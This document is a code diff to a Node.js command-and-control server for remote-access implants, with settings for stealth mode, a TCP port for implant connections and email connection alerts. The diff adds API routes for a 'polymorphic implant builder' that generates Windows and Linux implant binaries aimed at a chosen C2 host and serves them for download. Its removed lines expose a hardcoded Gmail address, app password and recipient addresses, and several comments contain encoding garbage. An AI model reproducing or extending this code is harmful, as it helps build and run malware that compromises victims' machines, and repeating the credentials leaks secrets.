@@ -1,12 +1,39 @@
-﻿// override: true ÔÇö PM2 often sets TCP_PORT=80 in ecosystem; .env TCP_PORT=2026 must win for Go clients.
-require('dotenv').config({ override: true });
+const fs = require('fs-extra');
+const path = require('path');
+
+// Load env: --env=local|production  OR  APP_ENV=local|production
+(function loadAppEnv() {
+  const arg = process.argv.find((a) => a.startsWith('--env='));
+  const raw = (arg && arg.split('=')[1]) || process.env.APP_ENV || process.env.NODE_ENV || 'local';
+  const appEnv = (raw === 'production' || raw === 'prod') ? 'production' : 'local';
+  const fileName = appEnv === 'production' ? '.env.production' : '.env.local';
+  const filePath = path.join(__dirname, fileName);
+  const fallback = path.join(__dirname, '.env');
+
+  if (fs.existsSync(filePath)) {
+    require('dotenv').config({ path: filePath, override: true });
+    console.log(`[ENV] Loaded ${fileName}`);
+  } else if (fs.existsSync(fallback)) {
+    require('dotenv').config({ path: fallback, override: true });
+    console.warn(`[ENV] ${fileName} missing - loaded .env instead`);
+  } else {
+    require('dotenv').config({ override: true });
+    console.warn(`[ENV] No ${fileName} or .env found - using process environment only`);
+  }
+
+  process.env.APP_ENV = appEnv;
+  if (appEnv === 'production') {
+    process.env.NODE_ENV = 'production';
+  } else if (!process.env.NODE_ENV || process.env.NODE_ENV === 'production') {
+    process.env.NODE_ENV = 'development';
+  }
+})();
+
 const express = require('express');
 const http = require('http');
 const socketIo = require('socket.io');
 const cors = require('cors');
 const multer = require('multer');
-const fs = require('fs-extra');
-const path = require('path');
 const net = require('net');
 const { v4: uuidv4 } = require('uuid');
 const moment = require('moment');
@@ -29,7 +56,7 @@ const io = socketIo(server, {
     methods: ["GET", "POST"],
     credentials: true
   },
-  // Default is ~1 MiB ÔÇö EXE uploads sent as base64 easily exceed that and fail silently
+  // Default is ~1 MiB ??? EXE uploads sent as base64 easily exceed that and fail silently
   maxHttpBufferSize: 128 * 1024 * 1024,
   pingTimeout: 120000,
   pingInterval: 25000
@@ -484,9 +511,21 @@ function persistDb() {
   fs.writeFileSync(dbPath, buffer);
 }
 
+function envBool(name, fallback = false) {
+  const v = process.env[name];
+  if (v === undefined || v === '') return fallback;
+  return !['0', 'false', 'no', 'off'].includes(String(v).toLowerCase());
+}
+
+function envList(name, fallback = []) {
+  const v = process.env[name];
+  if (!v || !String(v).trim()) return fallback;
+  return String(v).split(',').map((s) => s.trim()).filter(Boolean);
+}
+
 const defaultSettings = {
-  serverPort: 2026,
-  serverHost: '0.0.0.0',
+  serverPort: Number(process.env.TCP_PORT || 2026),
+  serverHost: process.env.TCP_HOST || '0.0.0.0',
   maxClients: 100,
   heartbeatInterval: 60,
   logLevel: 'info',
@@ -495,15 +534,15 @@ const defaultSettings = {
   stealthMode: true,
   logFile: './logs/c2.log',
   backupInterval: 24,
-  emailEnabled: true,
-  emailHost: 'smtp.gmail.com',
-  emailPort: 587,
-  emailSecure: false,
-  emailUser: 'fahis00786@gmail.com',
-  emailPass: 'xabadhtihzjnitxx',
-  emailFrom: 'fahis00786@gmail.com',
-  emailTo: ['zararanwar1234321@gmail.com','qaziwaseem4zetabytes@gmail.com'],
-  emailSubject: '!0 Connection Alert'
+  emailEnabled: envBool('EMAIL_ENABLED', true),
+  emailHost: process.env.EMAIL_HOST || 'smtp.gmail.com',
+  emailPort: Number(process.env.EMAIL_PORT || 587),
+  emailSecure: envBool('EMAIL_SECURE', false),
+  emailUser: process.env.EMAIL_USER || '',
+  emailPass: process.env.EMAIL_PASS || '',
+  emailFrom: process.env.EMAIL_FROM || process.env.EMAIL_USER || '',
+  emailTo: envList('EMAIL_TO', []),
+  emailSubject: process.env.EMAIL_SUBJECT || '!0 Connection Alert'
 };
 
 function getAllSettings() {
@@ -771,7 +810,7 @@ function getOrganizedFilePath(clientId, client, filename) {
   return path.join(clientDir, safeFilename);
 }
 
-/** If buffer is a ZIP (PKÔÇª) and basename is not already a zip-based type, use .zip so folder archives save correctly. */
+/** If buffer is a ZIP (PK??) and basename is not already a zip-based type, use .zip so folder archives save correctly. */
 function physicalDownloadBasename(remotePath, buffer) {
   const base = path.basename(remotePath || `download_${Date.now()}`);
   if (!Buffer.isBuffer(buffer) || buffer.length < 4) return base;
@@ -790,7 +829,7 @@ function logTcpDownloadProgress(pd) {
   if (mb < 1) return;
   if (pd._progressNextMb == null) pd._progressNextMb = 5;
   while (mb >= pd._progressNextMb) {
-    console.log(`[TCP] Download progress: ~${pd._progressNextMb} MiB ÔÇö ${path.basename(pd.filename || 'file')}`);
+    console.log(`[TCP] Download progress: ~${pd._progressNextMb} MiB ??? ${path.basename(pd.filename || 'file')}`);
     pd._progressNextMb += 5;
   }
 }
@@ -1447,8 +1486,8 @@ function normalizeTcpListenPort(raw) {
 
 /**
  * Implant TCP must not share the HTTP server port. If they match (e.g. .env TCP_PORT=5000 with PORT=5000),
- * use 2026 ÔÇö the default expected by lastfinalversion2.go.
- * Ports 80/443 see HTTP/TLS probes ÔåÆ JSON parse errors in logs; warn only.
+ * use 2026 ??? the default expected by lastfinalversion2.go.
+ * Ports 80/443 see HTTP/TLS probes ??? JSON parse errors in logs; warn only.
  */
 function resolveImplantTcpPort(rawTcpPort, rawHttpPort) {
   const httpP = normalizeTcpListenPort(rawHttpPort);
@@ -1567,7 +1606,7 @@ function requireAuth(req, res, next) {
   }
 }
 
-// Credential verification endpoint (for OTP flow) ÔÇö issues OTP and emails it in production
+// Credential verification endpoint (for OTP flow) ??? issues OTP and emails it in production
 app.post('/api/verify-credentials', async (req, res) => {
   await syncDatabaseFromDisk();
   const body = req.body || {};
@@ -1670,7 +1709,7 @@ app.post('/api/verify-otp', async (req, res) => {
   res.json({ token });
 });
 
-// Public login endpoint (direct ÔÇö prefer OTP flow via verify-credentials + verify-otp)
+// Public login endpoint (direct ??? prefer OTP flow via verify-credentials + verify-otp)
 app.post('/api/login', async (req, res) => {
   await syncDatabaseFromDisk();
   const body = req.body || {};
@@ -1917,7 +1956,7 @@ io.on('connection', (socket) => {
     }
   });
   
-  // Handle file upload (path only ÔÇö legacy; binary must follow on same TCP session)
+  // Handle file upload (path only ??? legacy; binary must follow on same TCP session)
   socket.on('uploadFile', (data) => {
     const { clientId, filename } = data;
     const client = clients.get(clientId);
@@ -2445,6 +2484,92 @@ app.delete('/api/users/:username', requireAuth, async (req, res) => {
   }
 });
 
+// ---- Polymorphic implant builder (Windows / Linux) ----
+const implantBuilder = require('./builder/polymorph');
+
+app.get('/api/builder/builds', requireAuth, (req, res) => {
+  try {
+    res.json({ builds: implantBuilder.listBuilds() });
+  } catch (e) {
+    res.status(500).json({ error: e.message || 'Failed to list builds' });
+  }
+});
+
+app.get('/api/builder/defaults', requireAuth, (req, res) => {
+  try {
+    const settings = getAllSettings();
+    const appEnv = process.env.APP_ENV || 'local';
+    const defaultHost =
+      process.env.BUILD_C2_HOST ||
+      (appEnv === 'local' ? '127.0.0.1' : '') ||
+      '';
+    const defaultPort = Number(
+      process.env.BUILD_C2_PORT ||
+      process.env.TCP_PORT ||
+      settings.serverPort ||
+      (appEnv === 'local' ? 2026 : 443)
+    );
+    res.json({
+      appEnv,
+      host: defaultHost,
+      port: defaultPort,
+      platforms: ['windows', 'linux'],
+      arches: ['amd64', '386', 'arm64'],
+    });
+  } catch (e) {
+    res.status(500).json({ error: e.message || 'Failed to load builder defaults' });
+  }
+});
+
+app.post('/api/builder/generate', requireAuth, async (req, res) => {
+  try {
+    const body = req.body || {};
+    const platform = String(body.platform || 'windows').toLowerCase();
+    const arch = String(body.arch || 'amd64').toLowerCase();
+    const settings = getAllSettings();
+    const appEnv = process.env.APP_ENV || 'local';
+    const host = String(
+      body.host ||
+      process.env.BUILD_C2_HOST ||
+      (appEnv === 'local' ? '127.0.0.1' : '') ||
+      ''
+    ).trim();
+    const port = Number(
+      body.port ||
+      process.env.BUILD_C2_PORT ||
+      process.env.TCP_PORT ||
+      settings.serverPort ||
+      (appEnv === 'local' ? 2026 : 443)
+    );
+    if (!host) {
+      return res.status(400).json({ error: 'C2 host is required' });
+    }
+    console.log(`[BUILDER] Generating ${platform}/${arch} -> ${host}:${port}`);
+    const meta = await implantBuilder.generateBuild({
+      platform,
+      arch,
+      host,
+      port,
+      outputName: body.outputName,
+    });
+    console.log(`[BUILDER] Done ${meta.id} sha256=${meta.sha256.slice(0, 12)}`);
+    res.json({ success: true, build: meta });
+  } catch (e) {
+    console.error('[BUILDER] Failed:', e.message);
+    res.status(500).json({ error: e.message || 'Build failed' });
+  }
+});
+
+app.get('/api/builder/download/:id', requireAuth, (req, res) => {
+  try {
+    const found = implantBuilder.getBuildPath(req.params.id);
+    if (!found) return res.status(404).json({ error: 'Build not found' });
+    res.download(found.filePath, found.meta.fileName);
+  } catch (e) {
+    res.status(500).json({ error: e.message || 'Download failed' });
+  }
+});
+
 // Serve React app
 app.get('*', (req, res) => {
   res.sendFile(path.join(__dirname, 'client/build', 'index.html'));
@@ -2453,6 +2578,7 @@ app.get('*', (req, res) => {
 const HOST = process.env.HOST || '0.0.0.0';
 const PORT = Number(process.env.PORT || 5000);
 server.listen(PORT, HOST, () => {
+  console.log(`[ENV] APP_ENV=${process.env.APP_ENV} NODE_ENV=${process.env.NODE_ENV}`);
   console.log(`[HTTP] Server running on ${HOST}:${PORT}`);
   console.log(`[GUI] Access !0 at: http://${HOST === '0.0.0.0' ? 'localhost' : HOST}:${PORT}`);
 });
